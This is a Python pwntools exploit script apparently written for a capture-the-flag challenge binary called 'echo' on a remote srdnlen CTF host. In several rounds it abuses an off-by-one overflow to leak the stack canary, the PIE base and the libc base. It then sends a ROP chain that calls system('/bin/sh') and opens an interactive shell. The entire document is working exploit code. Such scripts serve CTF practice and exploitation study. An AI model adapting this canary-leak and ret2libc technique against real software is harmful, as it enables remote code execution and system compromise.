from pwn import *

HOST = "echo.challs.srdnlen.it"
PORT = 1091

PROMPT = b"echo "
BUF_LEN = 64
CANARY_OFFSET = 72
ECHO_RET_OFFSET = 87
MAIN_RET_OFFSET = 119

ECHO_RET_ADDR = 0x1342
LIBC_STACK_RET = 0x2A1CA

elf = context.binary = ELF("./echo", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)


def start():
    if args.REMOTE:
        return remote(args.HOST or HOST, int(args.PORT or PORT))
    return process([elf.path], stdin=PIPE, stdout=PIPE)


def leak_with_next_len(io, current_limit, next_limit, leak_offset, marker):
    assert leak_offset == current_limit
    assert marker not in (0, 0x0A)

    payload = b"A" * BUF_LEN
    payload += p8(next_limit)
    payload += b"A" * (leak_offset - (BUF_LEN + 1))
    payload += p8(marker)

    io.recvuntil(PROMPT)
    io.send(payload)
    io.recvuntil(p8(marker))
    return io.recvuntil(b"\n", drop=True)


def main():
    io = start()

    # Round 1: the default limit is 0x40, so the off-by-one at index 64 lets us
    # raise the limit to 72 and reach the canary on the next iteration.
    io.recvuntil(PROMPT)
    io.send(b"A" * BUF_LEN + p8(CANARY_OFFSET))

    # Round 2: overwrite the canary's leading NULL to make puts() disclose it,
    # and stage the next round so we can reach the saved RIP from echo().
    canary_tail = leak_with_next_len(
        io, CANARY_OFFSET, ECHO_RET_OFFSET, CANARY_OFFSET, 0x42
    )
    canary = u64(canary_tail[:7].rjust(8, b"\x00"))
    log.success(f"canary = {canary:#x}")

    # Round 3: overwrite the last byte before echo()'s saved RIP so puts() prints
    # the full return address, then stage the next round to reach main()'s saved RIP.
    echo_ret_tail = leak_with_next_len(
        io, ECHO_RET_OFFSET, MAIN_RET_OFFSET, ECHO_RET_OFFSET, 0x43
    )
    echo_ret = u64(echo_ret_tail.ljust(8, b"\x00"))
    elf.address = echo_ret - ECHO_RET_ADDR
    log.success(f"pie base = {elf.address:#x}")

    # Round 4: overwrite the last byte before main()'s saved RIP and leak the
    # libc return address that __libc_start_main leaves on the stack.
    libc_ret_tail = leak_with_next_len(
        io, MAIN_RET_OFFSET, 0xFF, MAIN_RET_OFFSET, 0x44
    )
    libc_ret = u64(libc_ret_tail.ljust(8, b"\x00"))
    libc.address = libc_ret - LIBC_STACK_RET
    log.success(f"libc base = {libc.address:#x}")

    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    # Round 5: make the first byte NULL so echo() exits the loop, restore the
    # real canary, and return into system("/bin/sh").
    payload = b"\x00" + b"A" * (CANARY_OFFSET - 1)
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(libc.sym.system)

    io.recvuntil(PROMPT)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
